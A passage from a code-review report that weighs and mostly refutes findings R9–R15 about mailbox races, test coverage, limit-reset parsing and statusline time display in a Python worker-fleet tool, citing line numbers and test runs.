- *(confidence: medium)* The finding's code quote and control-flow claims are accurate (bin/fleet.py:1195-1202; call sites :4854/:5010/:5520 each sit last inside a try whose handler rolls back a successful dispatch). It fails on REACHABILITY of the triggering exception.  (1) No other opener exists for that path. _claimed_path (:1172-1173) is mailbox/<sid>.md.claimed.{os.getpid()} — suffixed with THIS fleet process's pid. Hooks compute their own pid-suffixed names (bin/hooks/posttooluse_mailbox.py:77, bin/hooks/stop_mailbox.py:134), so they never touch it. The only other toucher in the tree is _clean_worker_files (:6649-6656), which unlinks (a delete race raises FileNotFoundError — already handled), and _doctor_check_orphaned_claims (:8241), which only globs names and opens nothing. Nothing in the system holds a handle on that file.  (2) The cited precedent does not transfer. The hooks' `except PermissionError: sleep(0.05)` retry guards os.replace on mailbox/<sid>.md, a path with a real in-repo concurrent writer; the hook docstring names the cause exactly — "a transient NTFS lock from a concurrent append" (posttooluse_mailbox.py:75-76), i.e. append_mailbox holding <sid>.md open from another fleet process. That contention has no analogue for a pid-unique file created, read, closed and deleted by a single process. _clean_worker_files' `except OSError` is a bulk best-effort sweep over ~10 heterogeneous paths, not evidence of an observed failure on this one.  (3) The proposed mechanism cannot reach the call. The scenario requires an AV holding the FRESHLY RENAMED claim open for ~50ms. But between claim_mailbox's os.replace/read_text (:1185-1189) and claim.unlink() (:1200) lies all of dispatch_bg: a synchronous subprocess.run bounded by NATIVE_DISPATCH_TIMEOUT_SECONDS = 120.0 (:9454, :9748-9750), then _join_roster_by_short_id polling at NATIVE_JOIN_POLL_SECONDS = 3.0 up to NATIVE_JOIN_VERIFY_SECONDS = 60.0 (:9452-9453, :9590, :9792), then _await_attach (:9643). The gap is seconds to tens of seconds, so any scan provoked by the rename or by fleet's own read has long finished. The 50ms window the finding names closes before line 1200 executes.  What is left is "some unknown process might hold a pid-unique temp file open at exactly this instant" — speculative, which the review brief excludes. I hold medium rather than high confidence because a non-FileNotFoundError OSError on unlink is not provably impossible on Windows (e.g. a disconnected network/removable FLEET_HOME), but in that world dispatch_bg's own task-file write (:9683-9686) fails first and the rollback is the correct outcome anyway.

---

### R9 — restore_mailbox_claim does an unlocked read-truncate-write of the live mailbox, silently dropping concurrent mail

- `bin/fleet.py:1213`  |  claimed **high**  |  dimension `mailbox`

**Claim:** (a) Shell 1: `fleet send alpha "A"` takes the idle fork-steer path; `dispatch_bg` raises (claude CLI hiccup); `restore_mailbox_claim` at :4856 reads `mailbox/<sid>.md` (currently empty/absent-then-created). Shell 2 (or the supervisor tier), holding `fleet.lock`, hits the working/in-flight branch at :4729 and appends "B" to the same file. Shell 1 then executes `target.write_text("A\n\n" + newer)` with the pre-append `newer` — message "B" is gone, no error, no event, and `fleet status` shows a single pending-mail flag so nothing looks wrong.
(b) Same failed fork-steer, but `mailbox/<sid>.md` already holds "B" when restore starts. `write_text` correctly produces "A\n\nB"; the AV-held claim file makes `claim.unlink()` raise `PermissionError`; `os.replace` then clobbers the mailbox back to just "A". "B" is permanently lost.

**Refuted because:**

- *(confidence: high)* I re-read bin/fleet.py:1205-1226 and tested both claimed loss paths.  PATH (b) IS FACTUALLY WRONG ON WINDOWS — this is the finding's concrete, deterministic half and the reason it is rated high. The reviewer asserts that when `claim.unlink()` (:1219) raises "the same Windows PermissionError the hooks retry on", control reaches `os.replace(str(claim), str(target))` (:1225) and clobbers the merged file. The control flow is read correctly, but the platform semantics are not: `os.replace` -> MoveFileExW must open the SOURCE with DELETE access, exactly as `os.unlink` -> DeleteFileW does. Whatever denies the unlink denies the rename. Empirically, with a second open handle on the claim file (the AV/indexer sharing violation being cited):   unlink FAILED: PermissionError 32 (file in use by another process)   -> os.replace also FAILED: PermissionError 32   -> target preserved = MERGED_A_B I then ran the reviewer's scenario end-to-end against the real function (claim="A", newer mail="B", live handle held on the claim): mailbox after restore = 'A\n\nB'. Nothing lost. The `except OSError: pass` at :1225 swallows the identical failure; the only residue is a leaked claim file, not data loss. The single case where unlink fails but os.replace succeeds is a read-only attribute (WinError 5, verified: "os.replace SUCCEEDED; target now = A"). Nothing in the repo sets it — `grep -n "chmod|S_IREAD|S_IWRITE|attrib "` over bin/fleet.py and bin/hooks/*.py returns zero hits, and the claim file is a pid-private file this same process just minted via os.replace in a gitignored runtime dir. The cited precedent is also misattributed: the hooks' PermissionError retry (bin/hooks/posttooluse_mailbox.py:83-89, stop_mailbox.py:140-146) is on `os.replace` of the CONTENDED `<sid>.md` mailbox, not on unlinking a pid-private claim. `_read_and_discard` (:98-101) removes its claim with a bare `except OSError: pass` and no clobbering fallback.  PATH (a) DOES NOT EXECUTE THE CODE IT DESCRIBES. The stated scenario has shell 1 read `mailbox/<sid>.md` when it is "currently empty/absent-then-created". If the target is absent, `if target.exists():` (:1215) is False and `read_text`/`write_text` are never reached — the code goes straight to `os.replace`. The narrated "write_text with the pre-append newer" requires the target to already exist at the exists() check, which contradicts the scenario's own setup (cmd_send:4846 appends and compose_prompt:4849 immediately claims/renames the file away).  What does survive is much narrower than filed: the sub-claim that `restore_mailbox_claim` holds no lock while the competing `append_mailbox` at :4731/:4788 runs inside `with fleet_lock():` (opened at :4665) is accurate — I confirmed the lock scopes. So an unlocked read-truncate-write TOCTOU exists in principle. But triggering it needs a triple conjunction: a dispatch_bg failure in shell 1, a concurrent send/resume for the same sid, AND that append landing in the few-microsecond gap between `read_text` and `write_text` (or between `exists()` and `os.replace`). No test or run demonstrates it, and the respawn call sites (:5555, :5565) are unreachable for it at all — during respawn the record's session_id is None, so a concurrent `fleet send` is refused outright at :4719/:4783 ("dispatch in flight") and never appends to the old sid's mailbox.  Existing coverage: tests/test_core.py:524-566 (TestRestoreMailboxClaim) pins the merge ordering and the failed-launch round-trip; `py -3.13 -m pytest -q tests/test_core.py -k "RestoreMailboxClaim or FinalizeMailboxClaim or ClaimMailbox"` -> 9 passed.  Half the finding is disproven by execution, the other half's failure scenario does not run the quoted lines, and the "high" severity rests entirely on the disproven half.
- *(confidence: medium)* Path (b) — the finding's non-race, "no coincidence needed" half — is empirically false. It claims `claim.unlink()` (bin/fleet.py:1219) failing with a Windows PermissionError lets control fall to `os.replace(str(claim), str(target))` (:1225) and clobber the merged file. But os.replace needs DELETE access on the source exactly as unlink does, so the same lock fails both. Verified on this machine with py -3.13: with another handle open on the claim file, `unlink FAILED: PermissionError [WinError 32]` and `replace FAILED: PermissionError [WinError 32]`, and the target still read `MERGED`. The fallthrough is inert; it exists so a *failed* write_text still restores something, which it does. Same on POSIX (unlink and rename both need write+exec on the directory).  Path (a) rests on a premise that is wrong about this codebase: it says the competing writer `append_mailbox` runs inside fleet_lock so the lock gives no mutual exclusion. But the fork-steer path's own `append_mailbox(old_sid, message)` at bin/fleet.py:4846 is *outside* the lock too, and append_mailbox (:1237) is a plain `open(..., "a")`. Mailbox writes are lock-free append-only by design — fleet_lock guards the registry, never the mailbox — so no invariant is being violated.  What remains of (a) is a genuine but microsecond-wide TOCTOU, gated on a triple coincidence: dispatch_bg must raise, a second concurrent `fleet send` must have recreated mailbox/<sid>.md during the dispatch window, and a third append must land inside the read_text(:1217)→write_text(:1218) truncate gap. Two of the four cited call sites are additionally unreachable for the concurrent-append premise: the respawn sites :5555 and :5565 pre-claim with session_id=None, and a concurrent `fleet send` against a session_id-None record is refused outright at bin/fleet.py:4713-4721 ("dispatch in flight -- retry in a few seconds"), so no competing append_mailbox for that sid can exist. Only :4856 (fork-steer) and :5012 (resume-limited) keep session_id=old_sid across the window.  So: half the evidence is disproven, the framing invariant does not exist, half the call sites are guarded upstream, and the residual is a nanosecond-aligned race — not "silently dropping concurrent mail" at high severity.

---

### R10 — test_doctrine_is_not_restated_unqualified_while_it_is_false cannot fail in EITHER branch

- `tests/test_views_doctrine.py:238`  |  claimed **high**  |  dimension `tests-quality`

**Claim:** An author reverts `cmd_result`'s registry read from `read_registry_no_repair()` back to `load_registry()`. `tests/test_load_registry_callers.py::test_the_view_surface_is_not_among_the_callers` goes red and names `cmd_result`; the next reader's documented first instinct (that file says so itself at line 396-399) is to re-add the name to `ALLOWED`. With that done, `fleet result` quarantine-renames a corrupt `state/fleet.json` again, CLAUDE.md still says `CURRENT STATE: TRUE OF SHIPPED CODE`, and `test_doctrine_is_not_restated_unqualified_while_it_is_false` -- the one test whose entire job is to stop the documents restating D4 as fact while code violates it -- reports PASS, not SKIP and not FAIL.

**Refuted because:**

- *(confidence: high)* The reviewer read the control flow correctly but the failure scenario — the part that makes it a defect — is factually wrong, and I disproved it by measurement.  CONFIRMED (mechanics only): `tests/test_views_doctrine.py:253-254` computes `unqualified` purely from the document text, independent of the condition at :246. Measured in-process: CLAUDE.md claim paragraph [13] matches `_QUALIFIER_RE` on the token "CURRENT STATE" (from the now-affirmative "CURRENT STATE: TRUE OF SHIPPED CODE"); terminal-surface.md claim paragraphs [35,63,66,69,115,266,287] all match too. So both branches are non-failing today: condition False -> 2 skipped (today), condition True -> 2 PASSED (I re-armed it with a pytest plugin that replaces `fleet.cmd_result` with a `load_registry()` version and ran the node: "2 passed").  REFUTED (the failure scenario). The finding claims that after the one-word revert plus re-adding `cmd_result` to `ALLOWED`, "fleet result quarantine-renames a corrupt state/fleet.json again" with nothing red. Both steps are wrong:  1. Adding `cmd_result` to `ALLOWED` does NOT silence the guard. `tests/test_load_registry_callers.py:386-410 test_the_view_surface_is_not_among_the_callers` asserts `for name in ("cmd_peek","cmd_result","_resolve_worker_target"): assert name not in callers`, where `callers = _callers()` (line 109) is the unfiltered caller map — `ALLOWED` is never consulted by that test. Its own docstring at :395-399 states this is exactly why it names the three verbs individually: "the next reader's first instinct on that failure is to add the name back to ALLOWED", so this test was written so that instinct does not work. The finding cites those very lines as its escape hatch while missing that they describe the *generic* test it deliberately supplements.  2. The behavioural invariant is pinned by a file the finding never mentions: `tests/test_view_quarantine.py`. Running my simulated revert against it (PYTHONPATH plugin, no tracked file modified): "2 failed, 66 passed" — `TestTheViewsDoNotQuarantine::test_result_leaves_a_corrupt_registry_where_it_found_it` (tests/test_view_quarantine.py:322-327, which asserts via `_assert_registry_untouched` at :96-101 that `state/fleet.json` still exists with its original bytes and no `fleet.json.corrupt.*` artifact exists) and `test_the_view_names_the_repair_flag_through_main[result]` (:329-341). These drive the real `cmd_result` and assert on the filesystem; there is no allowlist to edit. So the invariant "views do not quarantine" is held by behavioural tests, not by the doc-drift pin.  The sub-recommendation to widen `_view_calls()` to `cmd_doctor` is also technically wrong. Default `cmd_doctor` is report-only and does not quarantine (pinned by tests/test_view_quarantine.py:126-134), so adding it changes nothing; `cmd_doctor(repair=True)` must quarantine per the operator gate recorded at tests/test_view_quarantine.py:29-32, so including it would jam `_any_view_still_quarantines()` permanently True — arming a pin that can never go green, the exact anti-pattern the file's design notes reject at :22-33.  What actually remains is much smaller than "high": `_QUALIFIER_RE` is token-based, so a *documentation* drift (code regresses while CLAUDE.md:13 still says "TRUE OF SHIPPED CODE") would not be caught by this one conditional test. That is a doc-freshness nit, not a broken invariant — and CLAUDE.md itself already discloses that this test "skips by design" today, so the docs do not overstate what it holds. No wrong behavior, data loss, or silent-failure path follows from it, because the code regression it worries about is caught behaviourally first.
- *(confidence: high)* The finding's *mechanical* measurement reproduces exactly — but its failure scenario is unreachable, because the reviewer never looked at the file that actually guards the code.  WHAT I CONFIRMED (the finding is right about these): - `tests/test_views_doctrine.py:246` skips today; `py -3.13 -m pytest -q tests/test_view_quarantine.py tests/test_views_doctrine.py tests/test_load_registry_callers.py` -> `83 passed, 2 skipped`, the 2 skips being that test's two params. - Running the test's own helpers in-process against the shipped documents: `CLAUDE.md claims: [13] UNQUALIFIED: []` (matched `'CURRENT STATE'`) and `terminal-surface.md claims: [35,63,66,69,115,266,287] UNQUALIFIED: []`. So if the condition were re-armed, the assertion at :253-262 would indeed pass. `_QUALIFIER_RE` (`tests/test_views_doctrine.py:93-101`) is polarity-blind.  WHY THAT DOES NOT PRODUCE THE CLAIMED OUTCOME. The finding's scenario ends: "`fleet result` quarantine-renames a corrupt `state/fleet.json` again ... and the one test whose entire job is to stop [this] reports PASS". The reviewer's premise is that `test_load_registry_callers.py` is the only other guard and can be neutered by adding `cmd_result` to `ALLOWED`. That premise is false. `tests/test_view_quarantine.py` — never mentioned in the finding — holds the same property BEHAVIOURALLY, against the filesystem, with no allowlist to edit:    tests/test_view_quarantine.py:323  test_result_leaves_a_corrupt_registry_where_it_found_it       path = _corrupt(home); with pytest.raises(...): fleet.cmd_result(args)       _assert_registry_untouched(home, path)   tests/test_view_quarantine.py:96-101  _assert_registry_untouched       assert path.exists(), "state/fleet.json was renamed aside"       assert path.read_text(encoding="utf-8") == CORRUPT       assert _quarantine_artifacts(home) == []  I injected the finding's exact regression (`fleet.read_registry_no_repair = fleet.load_registry`, the one-word revert; `cmd_result` at `bin/fleet.py:4394` calls that module global) via a pytest `-p` plugin and re-ran. Result: `21 failed, 47 passed` in `test_view_quarantine.py`, headed by `TestTheViewsDoNotQuarantine::test_result_leaves_a_corrupt_registry_where_it_found_it`, `..._peek_...`, `..._status_...`, all three params of `test_the_view_names_the_repair_flag_through_main`, `test_a_view_over_a_corrupt_registry_appends_no_event`, plus the whole `TestDoctorIsReportOnlyByDefault` class. A standalone probe confirmed the mechanism: `registry still on disk after cmd_result? False`, `quarantine artifacts: ['fleet.json.corrupt.2026-07-28T000845Z']`. So the regression is loud, immediate, and cannot be silenced by an allowlist edit — the assertions are `path.exists()` and `glob('fleet.json.corrupt*') == []`.  THE PIN IS A DOC PIN, AND ITS PERMANENT SKIP IS THE DOCUMENTED CONTRACT, NOT A DEFECT. `tests/test_views_doctrine.py:22-33` states the design: "while a view still quarantines -> the docs may not restate D4 unqualified; once no view quarantines -> the docs may say whatever they like ... this file goes green on its own with nothing deleted." `CLAUDE.md:13` discloses the same in the very sentence the finding quotes as misleading: "its D4 restatement test now **skips by design**, because an unqualified restatement is no longer a defect". The file never claimed to pin the CODE.  "CANNOT FAIL IN EITHER BRANCH" IS ALSO OVERSTATED. The assertion still fires for the regression pair it was built for: revert the code AND restore an unqualified restatement (any of the seven strings in `ORIGINAL_CLAIMS`, `tests/test_views_doctrine.py:274-295`, which `test_the_original_false_wording_is_still_recognised` keeps `_CLAIM_RE` able to see). It is not a no-op assertion; it is an assertion the current doc text happens to satisfy.  THE PROPOSED `_view_calls()` WIDENING IS WRONG. `cmd_doctor` default already does not quarantine — `TestDoctorIsReportOnlyByDefault` (`tests/test_view_quarantine.py:120-`) pins it, and `--repair` is the deliberate operator-typed quarantine path per `tests/test_load_registry_callers.py:216-219`. Adding it would change nothing.

---

### R11 — A `weekly` limit park gets a next-24-hours horizon; doctor then calls it "multi-day"

- `bin/fleet.py:1714`  |  claimed **medium**  |  dimension `limits-time`

**Claim:** Worker hits the weekly plan limit Monday. The 429 text carries a local wall-clock reset. `transcript_limit_scan` parks it `limited` with `limit_kind="weekly"` and `limit_reset_at` = Tuesday 13:00Z. `fleet doctor` reassures the operator this is a "multi-day horizon, expected" park. Tuesday 13:00Z the sweep (`fleet resume-limited`, no flags — the safe, documented invocation) fires, forks a new session, hits the weekly wall again, re-parks with a Wednesday horizon. This repeats once per day for six days: six wasted dispatches, six sid rotations, six mailbox drain/re-drain cycles, and a registry whose `retired_sids` grows every day.

**Refuted because:**

- *(confidence: medium)* The reviewer's line-level reading is correct — I confirmed it — but the defect is unreachable for every message shape a weekly wall could plausibly carry, and the harm model is wrong.  1) REACHABILITY IS THE WHOLE FINDING, AND IT IS UNPROVEN. The only verbatim 429 text ever captured on this machine is a SESSION limit: `spike/m0/VERDICTS.md:431` -- "You've hit your session limit - resets 4:40am (Asia/Qyzylorda)". No weekly 429 text has ever been observed; the weekly signal shape is still explicitly `DEFERRED-TO-KERNEL-PROBE` (docs/SPEC-v2-history.md:169, UL-OQ1). The finding's evidence block feeds the parser a message the reviewer invented ("You have hit your weekly limit -- resets 9am (America/New_York)"), then reports the parser's answer as a production outcome.  2) EVERY NATURAL DATE-BEARING PHRASING ALREADY NULL-PARKS -- the parser already does exactly what the finding asks for. `_LIMIT_RESET_LOCAL_RE` (bin/fleet.py:1606-1610) hard-requires `resets` immediately followed by digits, and `\s*\(` immediately after `am|pm`. Any date token in either slot kills the match, and `search` has no second `resets` to try. Measured at HEAD with `py -3.13`, anchor 2026-07-16T17:00Z:    "...weekly limit - resets Aug 3 at 9am (Asia/Qyzylorda)"  -> (None, 'weekly')   "...weekly limit - resets Wed 9am (Asia/Qyzylorda)"       -> (None, 'weekly')   "...weekly limit - resets 9am on Aug 3 (Asia/Qyzylorda)"  -> (None, 'weekly')   "...weekly limit - resets 8/3 9am (Asia/Qyzylorda)"       -> (None, 'weekly')   "...weekly limit - resets Aug 3, 9am (Asia/Qyzylorda)"    -> (None, 'weekly')   "...weekly limit - resets 9am (Asia/Qyzylorda)"           -> ('2026-07-17T04:00:00Z', 'weekly')  Only the last line is unsafe. So the finding's specific claim -- "A trailing date in the message ('resets 9am (America/New_York) on Aug 3') is silently discarded by the regex rather than refusing to guess" -- is false for every placement except one contrived post-paren form. The residue requires the vendor to emit a weekly reset with NO date at all, which would be an unusable message for the human reading it too.  3) THE FAILURE SCENARIO'S CENTRAL HARM IS FACTUALLY WRONG. It asserts an early resume "can burn a second limit hit." The repo's own G7 capture refutes that: `spike/m0/VERDICTS.md:434` -- "`usage` on this record is all-zero -- no real model call was made." A 429-walled fork consumes no plan quota, so the daily retry cannot extend the wall.  4) THE PROPOSED FIX IS OPERATIONALLY WORSE THAN THE BEHAVIOR IT REPLACES. A date-less "resets 9am" horizon converges: the wall-clock time-of-day is the same every day, so on the real reset day the sweep fires at the correct instant and the worker resumes unattended. The proposed `reset_at=None` is a permanent strand -- `cmd_resume_limited` skips a null horizon outright (bin/fleet.py:5163-5165, "reset horizon unknown -- needs --force-now"), so it requires a human. The module's "wrong horizon is worse than no horizon" rule (the D2 docstring) was written about `"resets 13am"` -> 1pm, a horizon in the WRONG PART OF THE DAY that never self-corrects; a same-time-of-day roll-forward is not that class.  5) THE DOCTOR LINE IS NOT A CLAIM ABOUT THE STORED FIELD. `_doctor_check_limited_parks` (bin/fleet.py:8171) is verbatim SPEC text (docs/SPEC-v2-history.md:189 and UL-OQ4 at :449): it tells the operator what a weekly PLAN window means -- "the wait is expected, not a stall" -- and `fleet status` separately prints the actual stored `resets <when>`. Calling it "the opposite of what is stored" overstates a static advisory into a computed assertion.  Also note the finding's loop needs `fleet resume-limited` invoked six times; there is no daemon that runs it (invariant 1, daemonless -- bin/fleet.py:5123-5125). It is an operator/supervisor action (skills/fleet/supervisor.md:76).  The only surviving true statement is a latent one: IF a date-less weekly 429 text ever ships, `kind="weekly"` is stored next to a <=24h horizon and doctor's advisory reads as reassurance. That is a speculative "this could be a problem if the vendor later..." -- explicitly out of scope -- not a demonstrated defect.
- *(confidence: medium)* The mechanics the reviewer describes are real and I reproduced them (bin/fleet.py:1712-1714 single-day rollover; _LIMIT_RESET_LOCAL_RE at :1606 has no date group; kind has no horizon consumer; doctor prints "multi-day horizon, expected" off limit_kind alone at :8165/:8172). But the failure requires an input that has never been observed and that the repo deliberately refuses to guess at. The local-format regex is pinned to exactly one corroborated production sentence — "You've hit your session limit -- resets 4:40am (Asia/Qyzylorda)" (bin/fleet.py:1541-1546, .superpowers/sdd/task-6-brief.md:12, knowledge/lessons.md:607) — and the weekly wall's wire text plus the session/weekly discriminator are recorded DEFERRED-TO-KERNEL-PROBE (docs/SPEC-v2-history.md:446) precisely because the wall cannot be forced without burning real usage. I ran the plausible weekly phrasings through the module: "...weekly limit. Your limit will reset on Aug 3 at 9am (America/New_York)" -> (None, 'weekly') (safe null-park) and "Claude usage limit reached. Your limit will reset at 9am (America/New_York)." -> (None, None) (no match at all; the regex requires the literal token "resets" adjoining the time). Only a hypothesized date-less or trailing-date weekly sentence mis-parses. Meanwhile the variant that IS reachable today is cosmetic, not harmful: "week" is a bare keyword scan over the joined message text (:1789-1792), so a session wall whose text also mentions weekly usage gets kind="weekly" with a CORRECT sub-5h horizon — misleading doctor NOTE, no wrong horizon, no wasted dispatch. The consequence chain is weaker than filed too: cmd_resume_limited is explicitly never automatic (:5122-5126, daemonless invariant 1), doctor's check is always ok=True and note-only, and a 429-rejected turn consumes no plan quota, so "burn a second limit hit" does not hold — residual cost is a few forked sids and retired_sids growth. A defect whose trigger is an unobserved upstream string, whose reachable form is a display note, and whose harm requires operator-initiated sweeps is defensive hardening against a deliberately deferred signal, not a defect in shipped behavior.

---

### R12 — Statusline prints the limit reset as a bare wall clock in UTC, off by the host's offset

- `bin/fleet_statusline.py:97`  |  claimed **medium**  |  dimension `limits-time`

**Claim:** Worker hits the wall; Claude's message says the limit resets at 4:40am local. Fleet stores `2026-07-16T23:40:00Z` (correct). The statusline shows `lim 1 resets 23:40`. The operator, who was told 4:40am by Claude and reads 23:40 in a bar whose other numbers are local, concludes the horizon was mis-parsed and either force-resumes early (`--force-now`, re-hitting the wall) or waits until 23:40 local — 5 hours past the actual reset.

**Refuted because:**

- *(confidence: medium)* The code observation is accurate: fleet._parse_iso (bin/fleet.py:1072) returns a UTC-aware datetime and _reset_clock (bin/fleet_statusline.py:97) strftimes it, so the statusline prints UTC hours unlabeled. I reproduced it end to end on this host (UTC+5, tzdata installed so Asia/Qyzylorda resolves): _parse_limit_signal yields '2026-07-16T23:40:00Z' and _reset_clock renders '23:40' while the human-facing reset is 04:40 local. The path is reachable and unguarded. But it is not a defect: (1) the stated failure scenario is directionally wrong for the host it was verified on -- at UTC+5 the displayed UTC clock is EARLIER than the true local reset, so a misreading operator acts ~5h early, not 'waits 5 hours past'; (2) the harmful early action is refused by cmd_resume_limited (bin/fleet.py:5166-5168), which tests the stored instant via _limit_reset_passed and skips with 'still before reset horizon (resets <full ISO with Z>)' -- printing exactly the corrective information; --force-now is then an explicit override of a refusal that just showed the truth; (3) the wait-too-long branch (negative-offset hosts) is self-correcting because bin/fleet_statusline.py:224-226 REPLACES the clock with 'resume-eligible' the instant _limit_reset_passed (UTC-correct, fleet.py:1806) flips, so the actionable signal lands at the true horizon regardless of how the clock was read; (4) every mutating/eligibility path uses the stored UTC instant, and the rendering matches its own docstring example, docs/specs/terminal-surface.md:167,175, and the pin tests/test_terminal_surface.py:372-374 -- doc and code agree, so this is not a doc asserting something the code does not do. What is left is an unlabeled-units display ambiguity on a purely informational field, i.e. a UX polish item, not wrong behavior, data loss, or a broken invariant.
- *(confidence: high)* The mechanical claim is accurate — fleet.py:1073 returns an aware UTC datetime and fleet_statusline.py:97 strftimes it, so the bar shows UTC hours (verified on this UTC+5 host: '2026-07-16T23:40:00Z' -> '23:40', local would be '04:40'). But the "defect" classification fails on five checks. (1) Nothing claims a local clock: the docstring at fleet_statusline.py:93 is literal ("'2026-07-09T14:20:00Z' -> '14:20'"), and grepping fleet_statusline.py and docs/specs/terminal-surface.md for utc|local|zone|tz returns zero hits — so the "docs assert something the code does not do" category does not apply. (2) The behavior is deliberately pinned: tests/test_terminal_surface.py:372-374 asserts "resets 14:20" from 14:20:00Z, an assertion that is host-TZ-independent only because rendering is UTC; the proposed .astimezone() fix renders 19:20 here and fails that test, and rots the spec receipt at terminal-surface.md:167. I ran `py -3.13 -m pytest -q tests/test_terminal_surface.py -k limited` — 9 passed. (3) The failure scenario does not survive the code: fleet_statusline.py:224-226 replaces the clock outright with `resume-eligible` once the horizon passes, and resume_eligible is derived live on every snapshot read (fleet.py:3107, `status == "limited" and _limit_reset_passed(rec)`), not persisted — so the field flips on its own at the correct real instant and the operator never needs the wall clock to know when to act. (4) The "next to local-frame quantities" claim is wrong: `idle 1 15m` and the stale suffixes come from _fmt_age (fleet_statusline.py:83-89) and are durations with no timezone; there is no other absolute clock on the line to conflict with. (5) The surfaces do not disagree about the instant — fleet.py:2962 prints the same value explicitly Z-labelled. All functional paths (_limit_reset_passed, resume-limited gating) use the aware UTC datetime and are correct; only a cosmetic %H:%M omits its zone marker.

---

### R13 — append_mailbox uses plain text-mode append, the exact pattern this file documents as silently losing whole records on Windows

- `bin/fleet.py:1234`  |  claimed **medium**  |  dimension `mailbox`

**Claim:** Worker `alpha` is idle. Shell 1 runs `fleet send alpha "A"`: it pre-claims under the lock (:4835-4839), releases the lock, and calls `append_mailbox(old_sid, "A")` at :4844 with no lock held. Shell 2 runs `fleet send alpha "B"` in the same instant: it acquires the lock, recomputes `status=="working"`/`in_flight`, and calls `append_mailbox(old_sid, "B")` at :4729. Both processes' CRT handles seek to EOF (offset 0 for a fresh mailbox) and then WriteFile; the second write lands at the same offset and overwrites the first. `fleet send` prints success in both shells and emits two `mail_sent` events, but only one message is ever drained by `compose_prompt`. This is the exact loss mode the `atomic_append_bytes` docstring measured at ~17%.

**Refuted because:**

- *(confidence: medium)* The physical premise is real and I reproduced it (builtin open(...,"a"), 4 threads x 250 records: got 937/936/927 of 1000, all unique = silent whole-record loss; _atomic_append_bytes: 1000/1000). But the filed failure scenario does not survive a reachability read.  (a) Factual error in the evidence: _migrate_residual_mailbox's open(new_path,"a") (bin/fleet.py:9360-9361) is NOT unlocked. Both call sites are inside `with fleet_lock():` — bin/fleet.py:4898 (inside _commit() opened at :4884) and bin/fleet.py:5056 (inside _commit() opened at :5038).  (b) The two-shell race is refuted by the lock the scenario itself invokes. Shell 1 holds fleet_lock through the pre-claim (:4834-4839) and releases it microseconds before append_mailbox at :4844. Shell 2 cannot enter the lock until that release; on contention it sleeps LOCK_RETRY_INTERVAL_SECONDS = 0.05 (bin/fleet.py:488, used at :523) and then must run load_registry(), native_epoch_suspicious(), recompute_worker_native(), has_fresh_outcome() and _launch_claim_expired() — several file reads — before reaching its append at :4729. So the lock protocol forces the two appends tens of milliseconds apart, in the opposite order from "the same instant". The vulnerable CRT window (_lseeki64(fd,0,SEEK_END) -> WriteFile) is ~1 microsecond wide, and hitting it would additionally require Shell 1 to be descheduled inside it.  (c) There is no unserialized writer population at all. All three append_mailbox call sites (:4729, :4786, :4844) sit immediately downstream of fleet_lock, and :4729/:4786 are inside it. The hooks never append — they claim by rename: os.replace(mailbox_file, claimed_file) at bin/hooks/posttooluse_mailbox.py:79 and bin/hooks/stop_mailbox.py:136. The free-running concurrent-writer condition that produces the measured loss is not generated by any code path in this repo.  (d) Two :4844 appends cannot coexist: Shell 1's pre-claim stamps last_dispatch_at = now_iso() (:4838), which makes Shell 2's in_flight test at :4712-4716 necessarily True (has_fresh_outcome false, _launch_claim_expired false), routing it to :4729 under the lock. That is a designed guard.  What remains is defense-in-depth hardening, not a defect with a concrete achievable failure scenario.

---

### R14 — doctor calls orphaned *.claimed.* files 'safe to remove' and points at `fleet clean`, which never sweeps them

- `bin/fleet.py:8243`  |  claimed **medium**  |  dimension `mailbox`

**Claim:** Worker `alpha` is idle and healthy. During its last turn the machine lost power between the Stop hook's `os.replace` and its `_read_and_discard`, leaving `mailbox/<alpha_sid>.md.claimed.9184` containing the manager's message "abort the migration, the schema is wrong". `fleet status` shows no `idle+mail` (`_pending_mail_count` at :2915 only stats `<sid>.md`). `fleet doctor` prints `[PASS] orphaned-claims: 1 orphaned mailbox/*.claimed.* file(s) (hook killed mid-claim; safe to remove manually, or run `fleet clean`)`. The operator runs `fleet clean` — `alpha` is idle, so nothing is swept and the warning persists — then deletes the file by hand as instructed, destroying the only copy of the message. Nothing ever told them the file was not empty.

**Refuted because:**

- *(confidence: medium)* The finding's headline claim is contradicted by the code it cites. `bin/fleet.py:6649` (`candidates += list(mailbox_dir().glob(f"{sid}.md.claimed.*"))`, inside `_remove_worker_files`, docstring at :6606-6610) is precisely a `*.claimed.*` sweeper reached by `fleet clean`, so "`fleet clean`, which never sweeps them" is false; for the dominant orphan case (hook killed because the worker was killed/died and is now `dead`) the suggestion works exactly as printed. For a live worker the advice is merely incomplete, and the same sentence already offers "remove manually".  "Safe to remove" is also defensible in the operational sense doctor means. Grep shows nothing in the tree ever reads a claim file — the only references are the path constructors (:1173, :1210), the clean sweep (:6649) and doctor's own glob (:8243) — so deletion cannot break delivery, the registry, or a hook. Keeping the file does not deliver the mail either (nothing auto-restores claims: `restore_mailbox_claim` is only called in-process on a failed dispatch at :4858/:5014/:5557/:5567, and `_migrate_residual_mailbox` at :9343 handles `<sid>.md` only). So the harm reduces to "the operator loses an inspectable copy", not broken behavior.  "Destroying the only copy of the message" is overstated: `fleet send` emits a durable `mail_sent` event (:4732, :4789, :4847) attesting the send, and the manager session that composed the text still has it — recovery is a re-send.  Reachability in the cited hook path is a sub-millisecond window: `_read_and_discard` (stop_mailbox.py:149-159) unlinks in a `finally`, so the file survives only if the process dies strictly between `os.replace` (:136) and the `open()` (:152). The realistically wide window is `claim_mailbox` -> `dispatch_bg` -> `finalize_mailbox_claim` (fleet.py:1184-1192), and on that path's success branch the mail WAS delivered inside the prompt — i.e. the orphan really is safe litter, exactly what the current wording says.  Citation sloppiness confirms a shallow read: "stop_mailbox.py:139-149 then delivery" is wrong (that range is `_claim`'s PermissionError retry plus `_read_and_discard`'s head; delivery is the `print` at :194), and `_clean_worker_files` is actually `_remove_worker_files`.  Verified factual residue: claim files really do print filenames only while orphaned `*.md` get `_mailbox_first_line` (:8252), and `_pending_mail_count` (:2912-2921) stats only `<sid>.md`. That makes a first-line preview a worthwhile polish on an advisory `ok=True` row — but it is not a medium-severity defect with a concrete wrong outcome, and it is filed under a title the code refutes.

---

### R15 — `_quarantine_registry` swallows every rename failure and returns the path as if the rename happened

- `bin/fleet.py:634`  |  claimed **medium**  |  dimension `registry-corruption`

**Claim:** Scenario A (measured, Windows, same-second collision):
```
first artifact: fleet.json.corrupt.2026-07-27T233021Z  content '{ bad one'
second artifact: fleet.json.corrupt.2026-07-27T233021Z
same name: True
registry still present: True     <-- the rename FAILED
registry content: '{ bad two'
artifact content now: '{ bad one'
```
